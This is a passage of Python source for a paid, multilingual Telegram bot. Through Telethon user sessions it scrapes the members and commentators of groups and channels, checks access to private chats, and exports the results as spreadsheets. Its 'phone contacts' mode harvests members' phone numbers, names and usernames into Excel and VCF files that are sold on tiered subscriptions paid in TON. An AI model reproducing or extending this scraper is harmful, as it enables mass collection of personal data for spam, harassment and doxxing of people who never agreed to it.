            continue
    return data

async def parse_phone_contacts(client, group_link, limit):
    entity = await client.get_entity(group_link)
    participants = await client.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User) and participant.phone:
            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.phone,
                participant
            ])
    return data

async def parse_auth_access(client, link, context):
    user_id = context.user_data.get('user_id')
    username = context.user_data.get('username', 'Без username')
    name = load_users().get(str(user_id), {}).get('name', 'Неизвестно')
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    try:
        parts = link.split('/')
        chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
        entity = await client.get_entity(chat_id)
        if hasattr(entity, 'participants_count'):
            await context.bot.send_message(chat_id=user_id, text=texts['auth_success'])
            await log_to_channel(context, f"Доступ к закрытому чату {chat_id} предоставлен для {name} (@{username})", username)
        else:
            await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
            await log_to_channel(context, f"Ошибка доступа к чату {chat_id} для {name} (@{username})", username)
    except telethon_errors.RPCError as e:
        await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
        await log_to_channel(context, f"Ошибка авторизации для {name} (@{username}): {str(e)}", username)

# Сообщение "Подождите..."
async def show_loading_message(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    await asyncio.sleep(2)
    if 'parsing_done' not in context.user_data:
        loading_message = await message.reply_text("Подождите..." if lang == 'Русский' else "Зачекай..." if lang == 'Украинский' else "Please wait..." if lang == 'English' else "Bitte warten...")
        context.user_data['loading_message_id'] = loading_message.message_id
        
        dots = 1
        while 'parsing_done' not in context.user_data:
            dots = (dots % 3) + 1
            new_text = ("Подождите" if lang == 'Русский' else "Зачекай" if lang == 'Украинский' else "Please wait" if lang == 'English' else "Bitte warten") + "." * dots
            try:
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id,
                    text=new_text
                )
            except telegram_error.BadRequest:
                break
            await asyncio.sleep(1)
        
        if 'parsing_done' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id
                )
            except telegram_error.BadRequest:
                pass

# Обработка парсинга
async def process_parsing(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    username = message.from_user.username or "Без username"
    name = message.from_user.full_name or "Без имени"
    users = load_users()
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    
    client = await get_telethon_client(user_id)
    context.user_data['parsing_in_progress'] = True
    asyncio.create_task(show_loading_message(message, context))
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await message.reply_text(texts['auth_error'].format(error="Не авторизован. Начните с /start"))
            context.user_data['parsing_done'] = True
            context.user_data['parsing_in_progress'] = False
            return

        all_data = []
        for link in context.user_data['links']:
            try:
                if link.startswith('@'):
                    normalized_link = f"https://t.me/{link[1:]}"
                elif not link.startswith('http'):
                    normalized_link = f"https://t.me/{link}"
                else:
                    normalized_link = link
                
                await client.get_entity(normalized_link.split('/')[-2] if context.user_data['parse_type'] in ['parse_post_commentators', 'parse_auth_access'] else normalized_link)
            except telethon_errors.ChannelPrivateError:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['no_access'].format(link=link))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['no_access'].format(link=link), username)
                return
            except telethon_errors.RPCError as e:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['rpc_error'].format(e=str(e)))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
                return
            
            limit = check_parse_limit(user_id, context.user_data['limit'], context.user_data['parse_type'])
            if context.user_data['parse_type'] == 'parse_authors':
                data = await parse_commentators(client, normalized_link, limit)
            elif context.user_data['parse_type'] == 'parse_participants':
                data = await parse_participants(client, normalized_link, limit)
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                data = await parse_post_commentators(client, normalized_link, limit)
            elif context.user_data['parse_type'] == 'parse_phone_contacts':
                data = await parse_phone_contacts(client, normalized_link, limit)
            elif context.user_data['parse_type'] == 'parse_auth_access':
                await parse_auth_access(client, normalized_link, context)
                context.user_data['parsing_done'] = True
                context.user_data['parsing_in_progress'] = False
                return
            
            all_data.extend(data)
        
        if context.user_data['parse_type'] == 'parse_phone_contacts':
            filtered_data = all_data
            excel_file = await create_excel_in_memory(filtered_data)
            vcf_file = create_vcf_file(pd.DataFrame(filtered_data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Phone', 'Nickname']))
            
            await message.reply_document(document=excel_file, filename="phones_contacts.xlsx", caption=texts['caption_phones'])
            await message.reply_document(document=vcf_file, filename="phones_contacts.vcf", caption=texts['caption_phones'])
            excel_file.close()
            vcf_file.close()
        else:
            filtered_data = filter_data(all_data, context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False}))
            count = len(filtered_data)
            entity = await client.get_entity(context.user_data['links'][0].split('/')[-2] if context.user_data['parse_type'] == 'parse_post_commentators' else context.user_data['links'][0])
            chat_title = entity.title
            
            excel_file = await create_excel_in_memory(filtered_data)
            stats = get_statistics(filtered_data)
            if context.user_data['parse_type'] == 'parse_authors':
                filename = f"{chat_title}_commentators.xlsx"
                caption = texts['caption_commentators']
                success_message = f'🎉 Найдено {count} комментаторов!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} коментаторів!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Kommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_participants':
                filename = f"{chat_title}_participants.xlsx"
                caption = texts['caption_participants']
                success_message = f'🎉 Найдено {count} участников!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} учасників!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} participants!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Teilnehmer gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                filename = f"{chat_title}_post_commentators.xlsx"
                caption = texts['caption_post_commentators']
                success_message = f'🎉 Найдено {count} комментаторов поста!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                f'🎉 Знайдено {count} коментаторів поста!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} post commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Beitragskommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            
            await message.reply_document(document=excel_file, filename=filename, caption=caption)
            excel_file.close()
            
            keyboard = [
                [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data=f"{context.user_data['parse_type']}"),
                 InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='close_parsing')]
            ]
            await message.reply_text(success_message, reply_markup=InlineKeyboardMarkup(keyboard))
            await log_to_channel(context, f"Успешный парсинг для {name} (@{username}): {context.user_data['parse_type']}, найдено {count} записей", username)
        
        update_user_data(user_id, name, context, requests=1)
        
    except telethon_errors.FloodWaitError as e:
        await message.reply_text(texts['flood_error'].format(e=str(e)))
        await log_to_channel(context, texts['flood_error'].format(e=str(e)), username)
    except telethon_errors.RPCError as e:
        await message.reply_text(texts['rpc_error'].format(e=str(e)))
        await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
    finally:
        context.user_data['parsing_done'] = True
        context.user_data['parsing_in_progress'] = False
        if client.is_connected():
            await client.disconnect()

# Обработчик кнопок
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username or "Без username"
    name = query.from_user.full_name or "Без имени"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    await query.answer()
    
    if query.data.startswith('lang_'):
        lang = query.data.split('_')[1]
        update_user_data(user_id, name, context, lang=lang)
        await query.edit_message_text(
            texts['subscribe'],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['subscribed'], callback_data='subscribed')]])
        )
        await log_to_channel(context, f"Выбор языка: {lang}", username)
    
    elif query.data == 'subscribed':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == 'update_menu':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == 'identifiers':
        await query.edit_message_text(
            texts['identifiers'],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
        )
        context.user_data['waiting_for_id'] = True
    
    elif query.data == 'close_id':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == 'continue_id':
        await query.edit_message_text(
            texts['identifiers'],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
        )
        context.user_data['waiting_for_id'] = True
    
    elif query.data == 'parser':
        keyboard = [
            [InlineKeyboardButton("Авторы чата" if lang == 'Русский' else "Автори чату" if lang == 'Украинский' else "Chat authors" if lang == 'English' else "Chat-Autoren", callback_data='parse_authors'),
             InlineKeyboardButton("Участники" if lang == 'Русский' else "Учасники" if lang == 'Украинский' else "Participants" if lang == 'English' else "Teilnehmer", callback_data='parse_participants')],
            [InlineKeyboardButton("Комментаторы поста" if lang == 'Русский' else "Коментатори поста" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data='parse_post_commentators'),
             InlineKeyboardButton(texts['phone_contacts'], callback_data='parse_phone_contacts')],
            [InlineKeyboardButton(texts['auth_access'], callback_data='parse_auth_access')],
            [InlineKeyboardButton(texts['close'], callback_data='update_menu')]
        ]
        await query.edit_message_text(texts['parser'], reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data in ['parse_authors', 'parse_participants', 'parse_post_commentators', 'parse_phone_contacts', 'parse_auth_access']:
        context.user_data['parse_type'] = query.data
        if query.data == 'parse_post_commentators':
            await query.edit_message_text(
                texts['link_post'],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
            )
        elif query.data == 'parse_auth_access':
            await query.edit_message_text(
                texts['auth_request'],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
            )
        else:
            await query.edit_message_text(
                texts['link_group'],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
            )
    
    elif query.data.startswith('limit_'):
        limit = query.data.split('_')[1]
        if limit == 'custom':
            context.user_data['waiting_for_limit'] = True
            await query.edit_message_text(
                texts['limit'],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]])
            )
        else:
            context.user_data['limit'] = int(limit)
            await ask_for_filters(query.message, context)
    
    elif query.data == 'skip_limit':
        context.user_data['limit'] = 150 if not users[str(user_id)]['subscription']['type'].startswith('Платная') else 1000
        del context.user_data['waiting_for_limit']
        await ask_for_filters(query.message, context)
    
    elif query.data == 'no_filter':
        context.user_data['limit'] = check_parse_limit(user_id, context.user_data.get('limit', 1000), context.user_data['parse_type'])
        context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
        await process_parsing(query.message, context)
    
    elif query.data == 'filter_yes':
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        filters[context.user_data['current_filter']] = True
        context.user_data['filters'] = filters
        del context.user_data['waiting_for_filters']
        next_filter = {'only_with_username': 'exclude_bots', 'exclude_bots': 'only_active', 'only_active': None}
        if next_filter[context.user_data['current_filter']]:
            context.user_data['current_filter'] = next_filter[context.user_data['current_filter']]
            context.user_data['waiting_for_filters'] = True
            await query.edit_message_text(
                texts[f'filter_{context.user_data["current_filter"]}'],
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                     InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                    [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
                ])
            )
        else:
            await process_parsing(query.message, context)
    
    elif query.data == 'filter_no':
        del context.user_data['waiting_for_filters']
        next_filter = {'only_with_username': 'exclude_bots', 'exclude_bots': 'only_active', 'only_active': None}
        if next_filter[context.user_data['current_filter']]:
            context.user_data['current_filter'] = next_filter[context.user_data['current_filter']]
            context.user_data['waiting_for_filters'] = True
            await query.edit_message_text(
                texts[f'filter_{context.user_data["current_filter"]}'],
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
                     InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
                    [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
                ])
            )
        else:
            await process_parsing(query.message, context)
    
    elif query.data == 'skip_filters':
        del context.user_data['waiting_for_filters']
        await process_parsing(query.message, context)
    
    elif query.data == 'close_parsing':
        message, reply_markup = get_main_menu(user_id, context)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == 'subscribe':
        keyboard = [
            [InlineKeyboardButton(texts['subscription_1h'], callback_data='sub_1h')],
            [InlineKeyboardButton(texts['subscription_3d'], callback_data='sub_3d')],
            [InlineKeyboardButton(texts['subscription_7d'], callback_data='sub_7d')],
            [InlineKeyboardButton(texts['close'], callback_data='update_menu')]
        ]
        await query.edit_message_text(texts['subscribe_button'], reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data.startswith('sub_'):
        sub_type = query.data.split('_')[1]
        amount = {'1h': 2, '3d': 5, '7d': 7}[sub_type]
        keyboard = [
            [InlineKeyboardButton(texts['payment_paid'], callback_data=f'paid_{sub_type}_{amount}')],
            [InlineKeyboardButton(texts['payment_cancel'], callback_data='update_menu')]
        ]
        await query.edit_message_text(
            texts['payment_wallet'].format(amount=amount, address=TON_WALLET_ADDRESS),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith('paid_'):
        _, sub_type, amount = query.data.split('_')
        context.user_data['waiting_for_hash'] = True
        context.user_data['subscription'] = {'type': f'Платная ({sub_type})', 'amount': int(amount)}
        await query.edit_message_text(
            texts['payment_hash'],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_cancel'], callback_data='update_menu')]])
        )
    
    elif query.data == 'requisites':
        await query.edit_message_text(
            texts['requisites'].format(support=SUPPORT_USERNAME),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
        )
    
    elif query.data == 'logs_channel':
        await query.edit_message_text(
            texts['logs_channel'],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['close'], callback_data='update_menu')]])
        )
    
    elif query.data.startswith('reject_'):
        rejected_user_id = query.data.split('_')[1]
        rejected_user = load_users().get(rejected_user_id, {})
        rejected_lang = rejected_user.get('language', 'Русский')
        await context.bot.send_message(
            chat_id=rejected_user_id,
            text=LANGUAGES[rejected_lang]['payment_error']
        )
        await query.edit_message_text("Транзакция отклонена.")
        await log_to_channel(context, f"Транзакция пользователя {rejected_user_id} отклонена", "Администратор")

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Ошибка: {context.error}\n{traceback.format_exc()}")
    if update and hasattr(update, 'effective_user'):
        user_id = update.effective_user.id
        username = update.effective_user.username or "Без username"
        name = update.effective_user.full_name or "Без имени"
        lang = load_users().get(str(user_id), {}).get('language', 'Русский')
        await log_to_channel(context, f"Ошибка для {name} (@{username}): {str(context.error)}", username)
        await context.bot.send_message(
            chat_id=user_id,
            text=LANGUAGES[lang]['rpc_error'].format(e=str(context.error))
        )

# Запуск бота
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("language", language))
    application.add_handler(CommandHandler("set_plan", set_plan))
    application.add_handler(CommandHandler("remove_plan", remove_plan))
    application.add_handler(CommandHandler("note", note))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_error_handler(error_handler)
    
    print("Бот запущен...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
